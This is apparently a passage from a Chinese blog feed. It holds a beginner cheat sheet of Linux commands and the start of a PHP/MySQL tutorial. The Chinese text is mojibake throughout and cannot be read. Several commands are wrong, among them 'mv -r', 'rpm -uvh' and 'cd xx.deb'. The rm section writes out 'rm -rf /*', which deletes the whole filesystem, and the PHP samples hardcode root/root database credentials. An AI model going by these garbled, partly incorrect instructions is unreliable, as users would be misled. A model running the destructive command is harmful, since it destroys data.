<h6 id="3-mkdirå‘½ä»¤ï¼ˆåˆ›å»ºæ–‡ä»¶å¤¹ï¼‰"><a href="#3-mkdirå‘½ä»¤ï¼ˆåˆ›å»ºæ–‡ä»¶å¤¹ï¼‰" class="headerlink" title="3.mkdirå‘½ä»¤ï¼ˆåˆ›å»ºæ–‡ä»¶å¤¹ï¼‰"></a>3.mkdirå‘½ä»¤ï¼ˆåˆ›å»ºæ–‡ä»¶å¤¹ï¼‰</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir tools          //åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸ºtoolsçš„ç›®å½•</span><br><span class="line">mkdir /bin/tools     //åœ¨æŒ‡å®šç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸ºtoolsçš„ç›®å½•</span><br><span class="line">mkdir -m 711 test1   //é…ç½®æ–‡ä»¶çš„æƒé™</span><br></pre></td></tr></table></figure>

<h6 id="4-touchå‘½ä»¤ï¼ˆåˆ›å»ºæ–‡ä»¶ï¼‰"><a href="#4-touchå‘½ä»¤ï¼ˆåˆ›å»ºæ–‡ä»¶ï¼‰" class="headerlink" title="4.touchå‘½ä»¤ï¼ˆåˆ›å»ºæ–‡ä»¶ï¼‰"></a>4.touchå‘½ä»¤ï¼ˆåˆ›å»ºæ–‡ä»¶ï¼‰</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch tools.txt      //åœ¨è¯¥ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåç¼€ä¸ºtxtçš„æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<h6 id="5-rmå‘½ä»¤ï¼ˆåˆ é™¤ç›®å½•ä¸æ–‡ä»¶ï¼‰"><a href="#5-rmå‘½ä»¤ï¼ˆåˆ é™¤ç›®å½•ä¸æ–‡ä»¶ï¼‰" class="headerlink" title="5.rmå‘½ä»¤ï¼ˆåˆ é™¤ç›®å½•ä¸æ–‡ä»¶ï¼‰"></a>5.rmå‘½ä»¤ï¼ˆåˆ é™¤ç›®å½•ä¸æ–‡ä»¶ï¼‰</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm æ–‡ä»¶å              //åˆ é™¤å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶</span><br><span class="line">rm -f æ–‡ä»¶å           //åˆ é™¤å½“å‰ç›®å½•çš„æ–‡ä»¶ï¼ˆä¸è¯¢é—®ï¼‰</span><br><span class="line">rm -r æ–‡ä»¶å¤¹å         //é€’å½’åˆ é™¤å½“å‰ç›®å½•ä¸‹æ­¤åçš„ç›®å½•</span><br><span class="line">rm -rf æ–‡ä»¶å¤¹å        //é€’å½’åˆ é™¤å½“å‰ç›®å½•ä¸‹æ­¤åçš„ç›®å½•ï¼ˆä¸è¯¢é—®ï¼‰</span><br><span class="line">rm -rf *              //å°†å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰ç›®å½•å’Œæ–‡ä»¶å…¨éƒ¨åˆ é™¤</span><br><span class="line">rm -rf /*             //å°†æ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å…¨éƒ¨åˆ é™¤ã€æ…ç”¨ï¼ç›¸å½“äºæ ¼å¼åŒ–ç³»ç»Ÿã€‘</span><br></pre></td></tr></table></figure>

<h6 id="6-mvå‘½ä»¤ï¼ˆä¿®æ”¹ç›®å½•ï¼‰"><a href="#6-mvå‘½ä»¤ï¼ˆä¿®æ”¹ç›®å½•ï¼‰" class="headerlink" title="6.mvå‘½ä»¤ï¼ˆä¿®æ”¹ç›®å½•ï¼‰"></a>6.mvå‘½ä»¤ï¼ˆä¿®æ”¹ç›®å½•ï¼‰</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv å½“å‰ç›®å½•å æ–°ç›®å½•å        //ä¿®æ”¹ç›®å½•åï¼ŒåŒæ ·é€‚ç”¨ä¸æ–‡ä»¶æ“ä½œ</span><br><span class="line">mv /usr/tmp/tool /opt       //å°†/usr/tmpç›®å½•ä¸‹çš„toolç›®å½•å‰ªåˆ‡åˆ° /optç›®å½•ä¸‹é¢</span><br><span class="line">mv -r /usr/tmp/tool /opt    //é€’å½’å‰ªåˆ‡ç›®å½•ä¸­æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹</span><br></pre></td></tr></table></figure>

<h6 id="7-cpå‘½ä»¤ï¼ˆæ‹·è´ç›®å½•ï¼‰"><a href="#7-cpå‘½ä»¤ï¼ˆæ‹·è´ç›®å½•ï¼‰" class="headerlink" title="7.cpå‘½ä»¤ï¼ˆæ‹·è´ç›®å½•ï¼‰"></a>7.cpå‘½ä»¤ï¼ˆæ‹·è´ç›®å½•ï¼‰</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/tmp/tool /opt       //å°†/usr/tmpç›®å½•ä¸‹çš„toolç›®å½•å¤åˆ¶åˆ° /optç›®å½•ä¸‹é¢</span><br><span class="line">cp -r /usr/tmp/tool /opt    //é€’å½’å‰ªåˆ‡å¤åˆ¶ç›®å½•ä¸­æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹</span><br></pre></td></tr></table></figure>

<h6 id="8-catå‘½ä»¤"><a href="#8-catå‘½ä»¤" class="headerlink" title="8.catå‘½ä»¤"></a>8.catå‘½ä»¤</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat æ–‡ä»¶å                    //æŸ¥çœ‹æ–‡ä»¶ä¸­çš„å…¨éƒ¨ä¿¡æ¯(é€‚åˆæŸ¥çœ‹å°æ–‡æ¡£)</span><br></pre></td></tr></table></figure>

<h6 id="9-rmpå‘½ä»¤ï¼ˆæ’ä»¶å®‰è£…å‘½ä»¤ï¼‰"><a href="#9-rmpå‘½ä»¤ï¼ˆæ’ä»¶å®‰è£…å‘½ä»¤ï¼‰" class="headerlink" title="9.rmpå‘½ä»¤ï¼ˆæ’ä»¶å®‰è£…å‘½ä»¤ï¼‰"></a>9.rmpå‘½ä»¤ï¼ˆæ’ä»¶å®‰è£…å‘½ä»¤ï¼‰</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯´æ˜ï¼šæ’ä»¶å®‰è£…å‘½ä»¤</span><br><span class="line">rpm -i httpd-2.2.3-22.0.1.el5.i386.rpm         //ä½¿ç”¨rpmæ–‡ä»¶å®‰è£…apache </span><br><span class="line">rpm -uvh httpd-2.2.3-22.0.1.el5.i386.rpm      //ä½¿ç”¨rpmæ›´æ–°apache </span><br><span class="line">rpm -e httpd                                 //å¸è½½/åˆ é™¤apache</span><br></pre></td></tr></table></figure>

<h6 id="10-ä¿®æ”¹ipå‘½ä»¤"><a href="#10-ä¿®æ”¹ipå‘½ä»¤" class="headerlink" title="10.ä¿®æ”¹ipå‘½ä»¤"></a>10.ä¿®æ”¹ipå‘½ä»¤</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¿®æ”¹ç½‘ç»œé…ç½®æ–‡ä»¶ï¼Œæ–‡ä»¶åœ°å€ï¼š/etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line">------------------------------------------------</span><br><span class="line">ä¸»è¦ä¿®æ”¹ä»¥ä¸‹é…ç½®ï¼š  </span><br><span class="line">TYPE=Ethernet               //ç½‘ç»œç±»å‹</span><br><span class="line">BOOTPROTO=static            //é™æ€IP</span><br><span class="line">DEVICE=ens00                //ç½‘å¡å</span><br><span class="line">IPADDR=192.168.1.100        //è®¾ç½®çš„IP</span><br><span class="line">NETMASK=255.255.255.0       //å­ç½‘æ©ç </span><br><span class="line">GATEWAY=192.168.1.1         //ç½‘å…³</span><br><span class="line">DNS1=192.168.1.1            //DNS</span><br><span class="line">DNS2=8.8.8.8                //å¤‡ç”¨DNS</span><br><span class="line">ONBOOT=yes                  //ç³»ç»Ÿå¯åŠ¨æ—¶å¯åŠ¨æ­¤è®¾ç½®</span><br><span class="line">-------------------------------------------------</span><br><span class="line">ä¿®æ”¹ä¿å­˜ä»¥åä½¿ç”¨å‘½ä»¤é‡å¯ç½‘å¡ï¼šservice network restart</span><br></pre></td></tr></table></figure>

<h6 id="11-aptå‘½ä»¤ï¼ˆä¸€èˆ¬è·Ÿéšsudoè¿›è¡Œï¼‰"><a href="#11-aptå‘½ä»¤ï¼ˆä¸€èˆ¬è·Ÿéšsudoè¿›è¡Œï¼‰" class="headerlink" title="11.aptå‘½ä»¤ï¼ˆä¸€èˆ¬è·Ÿéšsudoè¿›è¡Œï¼‰"></a>11.aptå‘½ä»¤ï¼ˆä¸€èˆ¬è·Ÿéšsudoè¿›è¡Œï¼‰</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install package_name å®‰è£…/æ›´æ–°ä¸€ä¸ªæ–°è½¯ä»¶åŒ…ï¼Œè½¯ä»¶ä¸´æ—¶å­˜æ”¾åˆ°/var/cache/apt/archives</span><br><span class="line">apt-cdrom install package_name ä»å…‰ç›˜å®‰è£…/æ›´æ–°ä¸€ä¸ªè½¯ä»¶åŒ…</span><br><span class="line">apt-get remove packagename #å¸è½½ä¸€ä¸ªå·²å®‰è£…çš„è½¯ä»¶åŒ…ï¼ˆä¿ç•™é…ç½®æ–‡æ¡£ï¼‰</span><br><span class="line">apt-get update å‡çº§åˆ—è¡¨ä¸­çš„è½¯ä»¶åŒ… </span><br><span class="line">apt-get upgrade å‡çº§æ‰€æœ‰å·²å®‰è£…çš„è½¯ä»¶</span><br><span class="line">apt-get clean ä»ä¸‹è½½çš„è½¯ä»¶åŒ…ä¸­æ¸…ç†ç¼“å­˜</span><br></pre></td></tr></table></figure>

<h6 id="12-sudoå‘½ä»¤"><a href="#12-sudoå‘½ä»¤" class="headerlink" title="12.sudoå‘½ä»¤"></a>12.sudoå‘½ä»¤</h6><p><code>sudo</code>æ˜¯linuxç³»ç»Ÿç®¡ç†æŒ‡ä»¤ï¼Œæ˜¯å…è®¸ç³»ç»Ÿç®¡ç†å‘˜è®©æ™®é€šç”¨æˆ·æ‰§è¡Œä¸€äº›æˆ–è€…å…¨éƒ¨çš„<code>root</code>å‘½ä»¤çš„ä¸€ä¸ªå·¥å…·ï¼Œå¦‚haltï¼Œrebootï¼Œsuç­‰ç­‰ã€‚æ¢å¥è¯è¯´é€šè¿‡æ­¤å‘½ä»¤å¯ä»¥è®©é<code>root</code>çš„ç”¨æˆ·è¿è¡Œåªæœ‰<code>root</code>æ‰æœ‰æƒé™æ‰§è¡Œçš„å‘½ä»¤ã€‚</p>
<h6 id="13-dpkgå‘½ä»¤ï¼ˆä½¿ç”¨æ—¶éœ€è¦æœ‰debè½¯ä»¶åŒ…ï¼‰"><a href="#13-dpkgå‘½ä»¤ï¼ˆä½¿ç”¨æ—¶éœ€è¦æœ‰debè½¯ä»¶åŒ…ï¼‰" class="headerlink" title="13.dpkgå‘½ä»¤ï¼ˆä½¿ç”¨æ—¶éœ€è¦æœ‰debè½¯ä»¶åŒ…ï¼‰"></a>13.dpkgå‘½ä»¤ï¼ˆä½¿ç”¨æ—¶éœ€è¦æœ‰debè½¯ä»¶åŒ…ï¼‰</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo dpkg -i xx.deb  ä¸ºå¯¹åº”çš„ä¸‹è½½xx.debè½¯ä»¶çš„å‘½ä»¤</span><br><span class="line">sudo dpkg -r xx.deb  ä¸ºå¯¹åº”çš„å¸è½½xx.debè½¯ä»¶çš„å‘½ä»¤</span><br><span class="line">sudo dpkg -c xx.deb  æ˜¾ç¤ºè½¯ä»¶åŒ…å†…æ–‡ä»¶åˆ—è¡¨</span><br><span class="line">sudo dpkg -l xx.deb  æŸ¥è¯¢è½¯ä»¶åŒ…çš„ç‰ˆæœ¬</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨è¿™ä¸ªå‘½ä»¤éœ€è¦æœ‰debè½¯ä»¶åŒ…</p>
<p>æ­¥éª¤ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å…ˆcd xx.deb</span><br><span class="line">æœ€åä¸‹è½½sudo dpkg -i xx.deb</span><br></pre></td></tr></table></figure>

<h6 id="14-yumå‘½ä»¤ï¼ˆubuntuéœ€é…ç½®yumå®‰è£…æºæ‰å¯ä½¿ç”¨ï¼‰"><a href="#14-yumå‘½ä»¤ï¼ˆubuntuéœ€é…ç½®yumå®‰è£…æºæ‰å¯ä½¿ç”¨ï¼‰" class="headerlink" title="14.yumå‘½ä»¤ï¼ˆubuntuéœ€é…ç½®yumå®‰è£…æºæ‰å¯ä½¿ç”¨ï¼‰"></a>14.yumå‘½ä»¤ï¼ˆubuntuéœ€é…ç½®yumå®‰è£…æºæ‰å¯ä½¿ç”¨ï¼‰</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install #å…¨éƒ¨å®‰è£…</span><br><span class="line">yum update #å…¨éƒ¨æ›´æ–°</span><br></pre></td></tr></table></figure>

<h6 id="15-åœ¨ubuntuä¸Šé…ç½®git"><a href="#15-åœ¨ubuntuä¸Šé…ç½®git" class="headerlink" title="15.åœ¨ubuntuä¸Šé…ç½®git"></a>15.åœ¨ubuntuä¸Šé…ç½®git</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨sudo apt-get install gitè¿›è¡Œå®‰è£…</span><br><span class="line">git --versionæŸ¥çœ‹ç‰ˆæœ¬</span><br><span class="line">git config --global user.name &quot;xxx&quot;</span><br><span class="line">git config --global user.email &quot;ä½ çš„é‚®ç®±åœ°å€&quot;</span><br><span class="line">ssh-keygen -t rsa -C &quot;é‚®ç®±åœ°å€&quot;   è¯¥å‘½ä»¤è·å–å…¬é’¥ï¼Œä¸€èˆ¬ä¼šå­˜åœ¨äº/root/.sshæ–‡ä»¶ä¸­</span><br><span class="line">gedit ~/.ssh/id_rsa.pub     ä½¿ç”¨è¯¥å‘½ä»¤æŸ¥çœ‹å…¬é’¥</span><br><span class="line">å¤åˆ¶å…¬é’¥è¿›è¡Œgithubçš„ä¸Šä¼ </span><br><span class="line">git config --list   å¯æŸ¥çœ‹é…ç½®ä¿¡æ¯</span><br></pre></td></tr></table></figure>

<h6 id="16-ubuntuæ¢æº"><a href="#16-ubuntuæ¢æº" class="headerlink" title="16.ubuntuæ¢æº"></a>16.ubuntuæ¢æº</h6><p>å…ˆå¤‡ä»½é•œåƒæºè®¾ç½®æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure>

<p>å†ç¼–è¾‘é•œåƒæºè®¾ç½®æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<p>æœ€åå¤åˆ¶ä¸‹é¢çš„æ‰€æœ‰å†…å®¹æ›¿æ¢æ‰åŸæ–‡ä»¶ä¸­çš„æ‰€æœ‰å†…å®¹ï¼ˆé˜¿é‡Œæºï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>

<h6 id="17-rootæ¨¡å¼"><a href="#17-rootæ¨¡å¼" class="headerlink" title="17.rootæ¨¡å¼"></a>17.rootæ¨¡å¼</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿›å…¥ä¸ºsu root</span><br><span class="line">é€€å‡ºä¸ºå¿«æ·é”®ctrl+dæˆ–è€…è¾“å…¥exit</span><br></pre></td></tr></table></figure>

<h6 id="18-pwdå‘½ä»¤ï¼ˆæŸ¥çœ‹ç›®å½•çš„ç»å¯¹è·¯å¾„ï¼‰"><a href="#18-pwdå‘½ä»¤ï¼ˆæŸ¥çœ‹ç›®å½•çš„ç»å¯¹è·¯å¾„ï¼‰" class="headerlink" title="18.pwdå‘½ä»¤ï¼ˆæŸ¥çœ‹ç›®å½•çš„ç»å¯¹è·¯å¾„ï¼‰"></a>18.pwdå‘½ä»¤ï¼ˆæŸ¥çœ‹ç›®å½•çš„ç»å¯¹è·¯å¾„ï¼‰</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwd /</span><br></pre></td></tr></table></figure>

<h6 id="19-å…³æœºå‘½ä»¤"><a href="#19-å…³æœºå‘½ä»¤" class="headerlink" title="19.å…³æœºå‘½ä»¤"></a>19.å…³æœºå‘½ä»¤</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shutdown -h now å…³é—­ç³»ç»Ÿ</span><br><span class="line">shutdown -r now é‡å¯ç³»ç»Ÿ</span><br><span class="line">reboot    é‡å¯ç³»ç»Ÿ</span><br></pre></td></tr></table></figure>

<h6 id="20-chmodå‘½ä»¤ï¼ˆæƒé™ç®¡ç†ï¼‰"><a href="#20-chmodå‘½ä»¤ï¼ˆæƒé™ç®¡ç†ï¼‰" class="headerlink" title="20.chmodå‘½ä»¤ï¼ˆæƒé™ç®¡ç†ï¼‰"></a>20.chmodå‘½ä»¤ï¼ˆæƒé™ç®¡ç†ï¼‰</h6><p>æ¯ä¸ªæ–‡ä»¶éƒ½æœ‰ä¸‰ä¸ªæƒé™åˆ†åˆ«æ˜¯râ€“è¯»ï¼Œwâ€“å†™ï¼Œxâ€“æ‰§è¡Œï¼Œåˆ†åˆ«å¯¹åº”æ•°å­—æ˜¯4ï¼Œ2ï¼Œ1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 764 nameå³èµ‹äºˆäº†nameæ–‡ä»¶æ‰€æœ‰äººçš„å…¨éƒ¨æƒé™ï¼Œæ–‡ä»¶æ‰€æœ‰ç»„æ‹¥æœ‰è¯»å’Œå†™çš„æƒé™ï¼Œè€Œå…¶ä»–äººåªæ‹¥æœ‰è¯»çš„æƒé™ã€‚</span><br></pre></td></tr></table></figure>

<p>777çš„ç¬¬ä¸€ä¸ª7ä»£è¡¨userå³æ–‡ä»¶æ‰€æœ‰äººï¼Œç¬¬äºŒä¸ª6ä»£è¡¨gourpå³æ–‡ä»¶æ‰€æœ‰ç»„ï¼Œç¬¬ä¸‰ä¸ª4ä»£è¡¨otherå³å…¶ä»–äºº</p>
<h6 id="21-gdb"><a href="#21-gdb" class="headerlink" title="21.gdb"></a>21.gdb</h6><p>gdbæ˜¯ä¸€ç§ç¨‹åºè°ƒè¯•å·¥å…·</p>
<h6 id="22-findå‘½ä»¤ï¼ˆå¯å¯»æ‰¾æ–‡ä»¶ï¼‰"><a href="#22-findå‘½ä»¤ï¼ˆå¯å¯»æ‰¾æ–‡ä»¶ï¼‰" class="headerlink" title="22.findå‘½ä»¤ï¼ˆå¯å¯»æ‰¾æ–‡ä»¶ï¼‰"></a>22.findå‘½ä»¤ï¼ˆå¯å¯»æ‰¾æ–‡ä»¶ï¼‰</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /home -name &quot;*.txt&quot;    ä¸ºå¯»æ‰¾/homeé‡Œçš„.txtæ–‡ä»¶</span><br><span class="line">find -name &quot;*.txt&quot;    ä¸ºå¯»æ‰¾è¯¥ç›®å½•ä¸‹çš„.txtæ–‡ä»¶</span><br></pre></td></tr></table></figure>

<h6 id="23-pså‘½ä»¤"><a href="#23-pså‘½ä»¤" class="headerlink" title="23.pså‘½ä»¤"></a>23.pså‘½ä»¤</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef         //æŸ¥çœ‹æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹</span><br></pre></td></tr></table></figure>

<h6 id="24-helpå‘½ä»¤"><a href="#24-helpå‘½ä»¤" class="headerlink" title="24.helpå‘½ä»¤"></a>24.helpå‘½ä»¤</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‘½ä»¤ --help</span><br></pre></td></tr></table></figure>

<h6 id="25-mountå‘½ä»¤ï¼ˆæŒ‚è½½ï¼‰"><a href="#25-mountå‘½ä»¤ï¼ˆæŒ‚è½½ï¼‰" class="headerlink" title="25.mountå‘½ä»¤ï¼ˆæŒ‚è½½ï¼‰"></a>25.mountå‘½ä»¤ï¼ˆæŒ‚è½½ï¼‰</h6><p>linuxåªèƒ½è®¿é—®æ ¹ç›®å½•é‡Œé¢çš„ä¸œè¥¿ï¼Œå¦‚æœæƒ³è¦è®¿é—®æ ¹ç›®å½•ä»¥å¤–çš„ä¸œè¥¿å°±éœ€è¦å…ˆâ€æŒ‚è½½â€œã€‚</p>
<h6 id="26-tailå‘½ä»¤å’Œheadå‘½ä»¤"><a href="#26-tailå‘½ä»¤å’Œheadå‘½ä»¤" class="headerlink" title="26.tailå‘½ä»¤å’Œheadå‘½ä»¤"></a>26.tailå‘½ä»¤å’Œheadå‘½ä»¤</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tail -5 /etc/passwd    #æŸ¥çœ‹å5è¡Œå†…å®¹</span><br><span class="line">head -5     #æŸ¥çœ‹å‰5è¡Œå†…å®¹</span><br></pre></td></tr></table></figure>

<h6 id="27-chownå‘½ä»¤ï¼ˆæ”¹å˜æ–‡ä»¶çš„å±ä¸»ï¼‰"><a href="#27-chownå‘½ä»¤ï¼ˆæ”¹å˜æ–‡ä»¶çš„å±ä¸»ï¼‰" class="headerlink" title="27.chownå‘½ä»¤ï¼ˆæ”¹å˜æ–‡ä»¶çš„å±ä¸»ï¼‰"></a>27.chownå‘½ä»¤ï¼ˆæ”¹å˜æ–‡ä»¶çš„å±ä¸»ï¼‰</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chown root /var/run/httpd.pid       /var/run/httpd.pid çš„æ‰€æœ‰è€…è®¾ç½® root</span><br><span class="line">chown runoob:runoobgroup file1.txt    å°†æ–‡ä»¶ file1.txt çš„æ‹¥æœ‰è€…è®¾ä¸º runoobï¼Œç¾¤ä½“çš„ä½¿ç”¨è€… runoobgroup </span><br><span class="line">chown -R runoob:runoobgroup *       å°†å½“å‰å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ä¸å­ç›®å½•çš„æ‹¥æœ‰è€…çš†è®¾ä¸º runoobï¼Œç¾¤ä½“çš„ä½¿ç”¨è€… runoobgroup</span><br></pre></td></tr></table></figure>

<h6 id="28-killå‘½ä»¤ï¼ˆç»“æŸè¿›ç¨‹ï¼‰"><a href="#28-killå‘½ä»¤ï¼ˆç»“æŸè¿›ç¨‹ï¼‰" class="headerlink" title="28.killå‘½ä»¤ï¼ˆç»“æŸè¿›ç¨‹ï¼‰"></a>28.killå‘½ä»¤ï¼ˆç»“æŸè¿›ç¨‹ï¼‰</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill pid       //æ€æ­»è¯¥pidçš„è¿›ç¨‹</span><br><span class="line">kill -9 pid    //å¼ºåˆ¶æ€æ­»è¯¥è¿›ç¨‹</span><br></pre></td></tr></table></figure>

<h6 id="29-grepå‘½ä»¤"><a href="#29-grepå‘½ä»¤" class="headerlink" title="29.grepå‘½ä»¤"></a>29.grepå‘½ä»¤</h6><p>ç”¨äºæŸ¥æ‰¾æ–‡ä»¶é‡Œç¬¦åˆæ¡ä»¶çš„å­—ç¬¦ä¸²</p>
<h6 id="30-tarå‘½ä»¤"><a href="#30-tarå‘½ä»¤" class="headerlink" title="30.tarå‘½ä»¤"></a>30.tarå‘½ä»¤</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -cvf test.tar test     å°†testæ–‡ä»¶å¤¹æ‰“åŒ…ä¸ºtest.tarå¹¶ä¸å‹ç¼©</span><br><span class="line">tar -zcvf test.tar.gz test     å°†testæ–‡ä»¶æ‰“åŒ…åä»¥gzipå‹ç¼©ï¼Œé»˜è®¤ä»¥tar.gzä¸ºç»“å°¾åç§°ä¸ºtest.tar.gz</span><br></pre></td></tr></table></figure>

<h6 id="31-moreå‘½ä»¤å’Œlesså‘½ä»¤ï¼ˆåˆ†å±æ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶çš„å†…å®¹ï¼‰"><a href="#31-moreå‘½ä»¤å’Œlesså‘½ä»¤ï¼ˆåˆ†å±æ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶çš„å†…å®¹ï¼‰" class="headerlink" title="31.moreå‘½ä»¤å’Œlesså‘½ä»¤ï¼ˆåˆ†å±æ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶çš„å†…å®¹ï¼‰"></a>31.moreå‘½ä»¤å’Œlesså‘½ä»¤ï¼ˆåˆ†å±æ˜¾ç¤ºæŒ‡å®šæ–‡ä»¶çš„å†…å®¹ï¼‰</h6><h6 id="32-whichå‘½ä»¤ï¼ˆæ˜¾ç¤ºå‘½ä»¤çš„ç»å¯¹è·¯å¾„ï¼‰"><a href="#32-whichå‘½ä»¤ï¼ˆæ˜¾ç¤ºå‘½ä»¤çš„ç»å¯¹è·¯å¾„ï¼‰" class="headerlink" title="32.whichå‘½ä»¤ï¼ˆæ˜¾ç¤ºå‘½ä»¤çš„ç»å¯¹è·¯å¾„ï¼‰"></a>32.whichå‘½ä»¤ï¼ˆæ˜¾ç¤ºå‘½ä»¤çš„ç»å¯¹è·¯å¾„ï¼‰</h6>]]></content>
  </entry>
  <entry>
    <title>mysqlåŸºç¡€</title>
    <url>/2022/11/15/mysql%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>mysqlåŸºç¡€</p>
<span id="more"></span>

<h2 id="é€šè¿‡phpæ¥ä½¿ç”¨mysql"><a href="#é€šè¿‡phpæ¥ä½¿ç”¨mysql" class="headerlink" title="é€šè¿‡phpæ¥ä½¿ç”¨mysql"></a>é€šè¿‡phpæ¥ä½¿ç”¨mysql</h2><p>1.åœ¨æ•°æ®åº“(database)ä¸­éƒ½å­˜åœ¨ç€ä¸€äº›è¡¨(table),è¡¨ä¸­è¿˜å­˜åœ¨ä¸€äº›è¡Œï¼Œåˆ—(column)</p>
<h4 id="2-åˆ›å»ºæ•°æ®åº“"><a href="#2-åˆ›å»ºæ•°æ®åº“" class="headerlink" title="2.åˆ›å»ºæ•°æ®åº“"></a>2.åˆ›å»ºæ•°æ®åº“</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯­æ³•CREATE DATABASE æ•°æ®åº“å</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect(&quot;localhost&quot;,&#x27;root&#x27;,&#x27;root&#x27;);//è¿æ¥æœ¬åœ°æ•°æ®åº“</span><br><span class="line">if(!$con)&#123;</span><br><span class="line">    die(&#x27;could not connect&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_query($con,&#x27;CREATE DATABASE my_db&#x27;);//åœ¨æœ¬åœ°åˆ›å»ºæ•°æ®åº“my_db</span><br><span class="line">mysqli_close($con);//å…³é—­æœ¬åœ°æ•°æ®åº“çš„è¿æ¥</span><br></pre></td></tr></table></figure>

<h4 id="3-åˆ›å»ºæ•°æ®åº“è¡¨"><a href="#3-åˆ›å»ºæ•°æ®åº“è¡¨" class="headerlink" title="3.åˆ›å»ºæ•°æ®åº“è¡¨"></a>3.åˆ›å»ºæ•°æ®åº“è¡¨</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯­æ³•</span><br><span class="line">CREATE TABLE è¡¨å</span><br><span class="line">(</span><br><span class="line">åˆ—å ç±»å‹,</span><br><span class="line">column_name2 data_type,</span><br><span class="line">column_name3 data_type,</span><br><span class="line">.......</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect(&quot;localhost&quot;,&#x27;root&#x27;,&#x27;root&#x27;);//è¿æ¥æœ¬åœ°æ•°æ®åº“</span><br><span class="line">if(!$con)&#123;</span><br><span class="line">    die(&#x27;could not connect&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_select_db($con,&#x27;my_db&#x27;);//é€‰æ‹©æ•°æ®åº“</span><br><span class="line">$h=&quot;CREATE TABLE user(    //åœ¨æ•°æ®åº“ä¸­å»ºç«‹ä¸€ä¸ªè¡¨ï¼Œå¹¶å¼€åˆ›3ä¸ªåˆ—</span><br><span class="line">    firstname varchar(15),</span><br><span class="line">    lastname varchar (15),</span><br><span class="line">    age int</span><br><span class="line">)&quot;;</span><br><span class="line">mysqli_query($con,$h);</span><br><span class="line">mysqli_close($con);//å…³é—­æœ¬åœ°æ•°æ®åº“çš„è¿æ¥</span><br></pre></td></tr></table></figure>

